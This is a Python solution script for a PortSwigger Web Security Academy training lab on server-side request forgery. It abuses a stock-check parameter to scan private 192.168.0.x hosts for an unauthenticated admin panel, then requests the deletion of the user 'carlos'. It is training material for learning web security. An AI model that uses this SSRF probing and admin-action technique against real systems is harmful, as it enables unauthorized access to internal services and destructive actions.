"""
Lab 2: Basic SSRF against another back-end system
https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
Difficulty: Apprentice

📝 Same storeId-as-URL primitive, but the target is a DIFFERENT internal
host — a private-range IP running an admin interface with no auth, since
it trusts "anything that can reach it" is internal.

Goal: find the internal admin host (private IP range) and delete carlos.
"""

from utils import get_session, log, note, stock_check

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"

# The lab hints at the internal host's IP in its description/Burp traffic —
# commonly a 192.168.0.x address with a non-standard admin port.
CANDIDATE_HOSTS = [f"192.168.0.{i}:8080" for i in range(1, 10)]


def run():
    s = get_session()

    note("Probing a small range of likely internal hosts — in the real lab")
    note("the exact IP is usually visible in the page/Burp traffic already;")
    note("this loop is a fallback for when it isn't handed to you directly.")

    for host in CANDIDATE_HOSTS:
        r = stock_check(s, TARGET, "1", f"http://{host}/admin")
        if r.status_code == 200 and "admin" in r.text.lower():
            log(f"Found internal admin panel at {host}")
            r = stock_check(s, TARGET, "1", f"http://{host}/admin/delete?username=carlos")
            log(f"Delete status: {r.status_code}")
            return

    log("No internal host found in the probed range — adjust CANDIDATE_HOSTS.", ok=False)


if __name__ == "__main__":
    run()
